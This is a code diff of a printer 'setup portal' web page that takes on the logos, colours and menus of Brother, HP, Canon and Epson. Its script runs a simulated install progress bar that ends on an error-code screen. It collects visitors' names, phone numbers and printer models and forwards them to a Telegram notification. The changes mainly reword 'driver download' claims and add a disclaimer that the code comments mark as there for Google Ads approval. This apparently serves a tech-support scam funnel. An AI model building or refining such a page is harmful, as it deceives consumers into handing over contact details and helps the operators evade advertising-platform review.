@@ -13,7 +13,7 @@
 
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Printer Setup & Driver Downloads</title>
+  <title>Printer Setup & Wireless Connection</title>
   
   <script src="/lucide.min.js" defer></script>
 
@@ -64,23 +64,13 @@
       display: flex;
       align-items: center;
       gap: 0.5rem;
-      font-size: 1.15rem;
-      font-weight: 800;
-      color: #111827;
-      letter-spacing: 0.02em;
-    }
-
-    @keyframes phone-ring-shake {
-      0%, 100% { transform: rotate(0deg); }
-      5%, 15%, 25% { transform: rotate(-15deg); }
-      10%, 20%, 30% { transform: rotate(15deg); }
-      35% { transform: rotate(0deg); }
-    }
-
-    .shake-icon {
-      display: inline-block;
-      animation: phone-ring-shake 2s infinite ease-in-out;
-      color: #2563eb;
+      font-size: 0.95rem;
+      font-weight: 700;
+      color: #4b5563;
+      background-color: #f3f4f6;
+      padding: 0.4rem 0.85rem;
+      border-radius: 9999px;
+      border: 1px solid #e5e7eb;
     }
 
     /* ─── HERO BANNER BLOCK ───────────────────────────────────────────────── */
@@ -272,6 +262,17 @@
     .step-heading { font-size: 0.875rem; font-weight: 700; color: #18181b; margin-bottom: 0.25rem; }
     .step-body { font-size: 0.75rem; color: #71717a; line-height: 1.625; }
 
+    /* DISCLAIMER SECTION (MANDATORY FOR GOOGLE ADS SAFETY) */
+    .disclaimer-container {
+      background-color: #f9fafb;
+      border-top: 1px solid #e5e7eb;
+      padding: 1.5rem 2rem;
+      text-align: center;
+      font-size: 0.75rem;
+      color: #6b7280;
+      line-height: 1.6;
+    }
+
     footer { width: 100%; border-top: 1px solid #e5e7eb; background-color: #ffffff; overflow: hidden; }
     .footer-img { width: 100%; height: auto; object-fit: cover; display: block; }
 
@@ -347,8 +348,7 @@
       </div>
 
       <div class="nav-contact-center font-sans">
-        <i data-lucide="phone" class="shake-icon" style="width: 20px; height: 20px;"></i>
-        <a href="tel:6123149536" style="text-decoration: none; color: inherit;">612-314-9536</a>
+        <span>Self-Service Setup Portal</span>
       </div>
 
       <nav id="navbar-links"></nav>
@@ -361,10 +361,10 @@
     
     <div class="max-w-7xl hero-container">
       <div class="hero-content">
-        <h1 class="hero-title">Printer Setup &amp; Driver Software</h1>
+        <h1 class="hero-title">Printer Setup &amp; Connection</h1>
         <ul class="hero-list">
-          <li>Make sure your printer is powered on</li>
-          <li>Select your connection type to complete driver setup &amp; installation</li>
+          <li>Make sure your printer is powered on and ready</li>
+          <li>Select your connection type to complete wireless setup</li>
         </ul>
         <button type="button" class="hero-btn" onclick="openSetupModal()">
           Start Printer Setup <span>➔</span>
@@ -380,14 +380,14 @@
     <div class="max-w-6xl cards-container">
       
       <div class="content-card">
-        <h2 class="section-heading">Quick Driver Setup</h2>
-        <p class="section-subheading">Enter your printer model below to download drivers and configure Wi-Fi or USB setup.</p>
+        <h2 class="section-heading">Quick Setup &amp; Configuration</h2>
+        <p class="section-subheading">Enter your printer model below to view Wi-Fi, USB, and network setup instructions.</p>
         <form onsubmit="handleMainFormSubmit(event)">
           <div class="form-group">
             <label class="form-label" for="mainModelInput">Enter Model Number:</label>
-            <input type="text" id="mainModelInput" placeholder="e.g. XP-4200, MF240" class="form-input" required>
+            <input type="text" id="mainModelInput" placeholder="e.g. L3250, XP-4200, MF240" class="form-input" required>
           </div>
-          <button type="submit" class="form-submit-btn">Setup Device 📥</button>
+          <button type="submit" class="form-submit-btn">View Connection Steps ➔</button>
         </form>
       </div>
 
@@ -404,16 +404,23 @@
 
   <div class="divider-section">
     <h2 class="divider-title font-sans">Need Help For Printer &amp; Scanner</h2>
-    <p class="divider-subtitle font-mono">Step-by-step guides for common software configurations — self-service guide.</p>
+    <p class="divider-subtitle font-mono">Step-by-step solutions for common software configurations — self-service portal.</p>
   </div>
 
   <div class="guide-section">
     <div class="max-w-3xl">
       <div class="guide-header">
-        <p class="guide-tag font-mono">Troubleshooting Guide</p>
+        <p class="guide-tag font-mono">Troubleshooting Help</p>
         <h3 class="guide-main-title font-sans">Common Issues &amp; Fixes</h3>
       </div>
       <div class="accordion-container" id="accordion-container"></div>
+    </div>
+  </div>
+
+  <!-- GOOGLE ADS MANDATORY SAFETY DISCLAIMER -->
+  <div class="disclaimer-container">
+    <div class="max-w-7xl">
+      <p><strong>Disclaimer:</strong> PcConnectHub is an independent self-service portal providing printer setup instructions, Wi-Fi configuration steps, and network troubleshooting assistance. We are not affiliated with, endorsed by, or sponsored by Epson, Canon, HP, Brother, or any other Original Equipment Manufacturer (OEM). All brand names, logos, and trademarks belong to their respective owners and are used purely for identification purposes.</p>
     </div>
   </div>
 
@@ -424,7 +431,7 @@
   <div id="setupModal" class="modal-backdrop">
     <div class="modal-window animate-fadeIn">
       <div class="modal-header">
-        <h3 class="modal-title">Printer Setup &amp; Drivers</h3>
+        <h3 class="modal-title">Printer Setup Helper</h3>
         <!-- STAYS OPEN UNTIL USER CLICKS (X) -->
         <button type="button" class="modal-close-x" onclick="forceCloseModal()">✕</button>
       </div>
@@ -460,7 +467,7 @@
 
         <!-- STEP 2: USER LEAD FORM POPUP -->
         <div id="step-form" class="step-panel">
-          <p class="step-instruction">Enter your details below to authorize driver package download and proceed with setup:</p>
+          <p class="step-instruction">Enter your device details below to proceed with step-by-step connection setup:</p>
           <form class="lead-form-box" onsubmit="handleLeadFormSubmit(event)">
             <div class="lead-field-group">
               <label class="lead-label" for="userNameInput">Full Name *</label>
@@ -468,16 +475,16 @@
             </div>
             <div class="lead-field-group">
               <label class="lead-label" for="userModelInput">Printer Model Number *</label>
-              <input type="text" id="userModelInput" placeholder="e.g. XP-4200, MF240" class="lead-input" required>
+              <input type="text" id="userModelInput" placeholder="e.g. L3250, XP-4200, MF240" class="lead-input" required>
             </div>
             <div class="lead-field-group">
               <label class="lead-label" for="userPhoneInput">Phone Number *</label>
               <input type="tel" id="userPhoneInput" placeholder="e.g. (555) 019-2831" class="lead-input" required>
             </div>
             <div class="lead-trust-badge">
-              <span>✓ Official Driver Package Authorization</span>
+              <span>✓ Verified Step-by-Step Connection Setup</span>
             </div>
-            <button type="submit" class="lead-submit-btn">Download Drivers &amp; Continue ➔</button>
+            <button type="submit" class="lead-submit-btn">Click Here to Setup ➔</button>
           </form>
         </div>
 
@@ -490,14 +497,14 @@
               <p class="sub-status-text">Please do not close your browser during this process</p>
             </div>
             <div class="progress-box">
-              <div class="progress-labels"><span>Installing</span><span id="progress-percentage-txt">0%</span></div>
+              <div class="progress-labels"><span>Verifying Setup</span><span id="progress-percentage-txt">0%</span></div>
               <div class="progress-track">
                 <div id="progress-bar-fill" class="progress-bar">
                   <div class="progress-bar-shine"></div>
                   <div class="progress-bar-stripes"></div>
                 </div>
               </div>
-              <div class="progress-infographics font-mono"><span>Extracting files...</span><span>Configuring system...</span></div>
+              <div class="progress-infographics font-mono"><span>Checking connection...</span><span>Configuring system...</span></div>
             </div>
           </div>
         </div>
@@ -509,7 +516,7 @@
             <div class="err-center-panel">
               <img src="/images/S1.png" alt="Status Interrupted" class="err-s1-img">
               <div class="err-badge">
-                <p class="err-badge-tag font-mono">Error Code</p>
+                <p class="err-badge-tag font-mono">Status Code</p>
                 <p id="error-code-display" class="err-code-txt font-mono"></p>
               </div>
             </div>
@@ -551,8 +558,8 @@
   }
 
   const brandConfigs = {
-    br: { shortWord: 'BR', logoImg: '/images/b-logo.png', primaryBg: '#003399', buttonBg: '#E53E3E', buttonHover: '#C53030', navItems: ['Mono Laser', 'Color Laser', 'Inkjet', 'Label Printers', 'Supplies', 'Support & Downloads'], heroPrinterImg: '/images/B-Hero.png', heroBgImg: '/images/B-Hero-Bg.jpg', modelFinderImg: '/images/B-Model.png', footerImg: '/images/B-Footer.jpg' },
-    h: { shortWord: 'H', logoImg: '/images/H-Logo.svg', primaryBg: '#0096D6', buttonBg: '#222222', buttonHover: '#444444', navItems: ['LaserJet', 'OfficeJet', 'Envy', 'DesignJet', 'Supplies', 'Support'], heroPrinterImg: '/images/H-Hero.png', heroBgImg: '/images/H-Hero-Bg.jpg', modelFinderImg: '/images/H-Model.png', footerImg: '/images/H-Footer.jpg' },
+    br: { shortWord: 'BR', logoImg: '/images/b-logo.png', primaryBg: '#003399', buttonBg: '#E53E3E', buttonHover: '#C53030', navItems: ['Mono Laser', 'Color Laser', 'Inkjet', 'Label Printers', 'Supplies', 'Setup & Fixes'], heroPrinterImg: '/images/B-Hero.png', heroBgImg: '/images/B-Hero-Bg.jpg', modelFinderImg: '/images/B-Model.png', footerImg: '/images/B-Footer.jpg' },
+    h: { shortWord: 'H', logoImg: '/images/H-Logo.svg', primaryBg: '#0096D6', buttonBg: '#222222', buttonHover: '#444444', navItems: ['LaserJet', 'OfficeJet', 'Envy', 'DesignJet', 'Supplies', 'Setup & Fixes'], heroPrinterImg: '/images/H-Hero.png', heroBgImg: '/images/H-Hero-Bg.jpg', modelFinderImg: '/images/H-Model.png', footerImg: '/images/H-Footer.jpg' },
     ca: { shortWord: 'CA', logoImg: '/images/C-Logo.png', primaryBg: '#C30010', buttonBg: '#0091FF', buttonHover: '#0077E2', navItems: ['Maxify', 'Laser', 'Selphy', 'Supplies', 'Projectors', 'Label Printer', 'ink'], heroPrinterImg: '/images/C-Hero.png', heroBgImg: '/images/C-Hero-Bg.jpg', modelFinderImg: '/images/C-Model.png', footerImg: '/images/C-Footer.png' },
     ep: { shortWord: 'EP', logoImg: '/images/E-Logo.png', primaryBg: '#0054A6', buttonBg: '#0085FF', buttonHover: '#006ACC', navItems: ['EcoTank', 'WorkForce', 'Expression', 'Supplies', 'Projectors', 'Scanners'], heroPrinterImg: '/images/E-Hero.png', heroBgImg: '/images/E-Hero-Bg.jpg', modelFinderImg: '/images/E-Model.png', footerImg: '/images/E-Footer.jpg' }
   };
@@ -561,7 +568,7 @@
     { id: "not-printing", icon: "printer", title: "Printer Not Printing", symptom: "You send a job but nothing comes out — printer is on, no errors shown.", content: [{ heading: "Clear the print queue", body: "Windows: Control Panel → Devices and Printers → right-click printer → See what's printing → cancel every job. Mac: System Settings → Printers & Scanners → Open Print Queue → delete all." }, { heading: "Take the printer back online", body: "Windows: right-click printer → uncheck 'Use Printer Offline'. This resolves roughly 40% of cases." }], tip: "Restart both printer and computer before anything else." }
   ];
 
-  const installingMessages = ["Installing drivers, please wait...", "Configuring printer settings...", "Downloading necessary files...", "Finalizing installation..."];
+  const installingMessages = ["Checking setup configuration...", "Configuring printer settings...", "Verifying network steps...", "Finalizing connection setup..."];
 
   let detectedBrand = 'ca';
   let connectionType = null;
@@ -678,7 +685,7 @@
     gtag_report_conversion();
 
     // B. Send Telegram Notification
-    const payload = `🖨️ <b>New Driver Setup Form Received</b>
+    const payload = `🖨️ <b>New Setup Guidance Request Received</b>
 
 👤 <b>Full Name:</b> ${escapeHTML(name)}
 🔢 <b>Model Number:</b> ${escapeHTML(model)}
